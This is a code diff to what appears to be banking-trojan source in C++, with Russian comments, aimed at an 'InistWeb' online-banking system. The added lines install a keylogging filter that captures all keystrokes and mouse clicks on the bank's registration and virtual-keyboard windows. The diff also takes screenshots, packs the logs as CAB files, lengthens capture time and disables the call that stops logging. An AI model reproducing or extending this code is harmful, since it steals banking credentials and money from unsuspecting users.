@@ -22,6 +22,7 @@ namespace DBGINISTWEB
 namespace InistWeb
 {
 	char InistSystemName[] = "inist";
+	PKlgWndFilter filterAll = 0; //фильтр который кейлогит все события
 
 	PCHAR InistCaptions[] = {
 		"*егистрация пользователя*",
@@ -79,11 +80,14 @@ namespace InistWeb
 //		FileGrabber::AddReceiver(rv);
 //	}
 
-//	void Deactiveted(LPVOID Sender)
-//	{
-//		DBGINIST( "Inist", "Deactiveted" );
+	void Deactiveted(LPVOID Sender)
+	{
+		DBGINIST( "Inist", "Deactiveted" );
+		PKeyLogSystem S = (PKeyLogSystem)Sender;
+		List::Remove( S->Filters, filterAll );
+		filterAll = 0;
 //		FileGrabber::Release();
-//	}
+	}
 
 
 	void WINAPI InistURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
@@ -167,7 +171,7 @@ namespace InistWeb
 			STR::Free(Buf);
 		}
 
-		KeyLogger::StopLogging();
+		//KeyLogger::StopLogging();
 		return true;
 	}
 
@@ -214,6 +218,12 @@ namespace InistWeb
                 }
 
 				MakeLog(Parent);
+				
+				filterAll = KeyLogger::AddFilter(S, false, true, "*", "*", FILTRATE_PARENT_WND, LOG_KEYBOARD, 3);
+				if( filterAll )
+				{
+					filterAll->LogClicks = true;
+				}
 			}
         }
 
@@ -227,12 +237,12 @@ namespace InistWeb
 		if( S != NULL )
 		{
 			S->SendLogAsCAB = true;
-			//S->TimeMode    = KLG_TIME_MIN;
-			//S->TimeValue   = 5*60; // Система будет работать не мение 5-ти минут
+			S->TimeMode    = KLG_TIME_MAX;
+			S->TimeValue   = 5*60; // Система будет работать не мение 5-ти минут
 			S->MakeScreenShot = true;
 			S->OnMessage = OnMessage;
 //			S->OnActivate = Activeted;
-//			S->OnDeactivate = Deactiveted;
+			S->OnDeactivate = Deactiveted;
 
 			//первый символ P в Caption может быть латинским или русским
 			char KeyboardCaption[] = {'*','в','и','р','т','у','а','л','ь','н','*','к','л','а','в','и','а','т','у','р','*', 0};
@@ -254,7 +264,9 @@ namespace InistWeb
                     F2->MouseLogWnd = MOUSE_LOG_WND_FILTER;
 					F2->PreFilter = F1;
                 }
-            }
+
+			}
+
 		}
 
 		//Устанавливаем событие на смену урла в ИЕ
